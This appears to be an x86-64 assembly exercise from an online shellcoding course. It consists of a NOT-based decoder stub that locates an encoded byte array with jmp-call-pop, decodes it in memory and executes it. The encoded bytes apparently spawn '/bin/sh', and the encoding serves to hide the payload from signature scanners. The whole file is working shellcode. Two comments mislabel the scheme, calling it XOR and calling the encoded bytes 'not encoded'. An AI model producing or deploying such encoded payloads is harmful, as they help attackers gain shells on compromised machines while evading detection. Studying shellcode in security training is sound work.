; David @InfinitelyManic
; code from course: http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/
;
section .bss
section .data
section .mytext progbits alloc exec write align=16
        global _start
_start:
        nop
        jmp find_address

decoder:
        pop rdi
        xor rcx, rcx
        add cl, (16 * 4 )-5             ; size of encoded shellcode - loop

decode:
        not byte [rdi]          ; XOR cipher key
        inc rdi
        loop decode

        jmp short encoded_shellcode

_exit:
        xor rax, rax
        add al, 60
        xor rdi, rdi
        syscall

find_address:
        call decoder
        ; some not encoded shellcode
        encoded_shellcode: db \
        0x14,0xe2,0xb7,0xce,0x3f,0xa0,0x77,0x98,0xf8,0xb7,0x76,0x80,0xf7,0xb7,0x76,0xb8,0xef,0xb7,0x72,0x88,0xf7,0xb7,0x72,0xa8,0xef,0xb7,0x7c,0x3f,0xc4,0xf0,0xfa,0x17,0x21,0x00,0x00,0x00,0xd0,0x9d,0x96,0x91,0xd0,0x8c,0x97,0xbe,0xbd,0xbd,0xbd,0xbd,0xbd,0xbd,0xbd,0xbd,0xbc,0xbc,0xbc,0xbc,0xbc,0xbc,0xbc


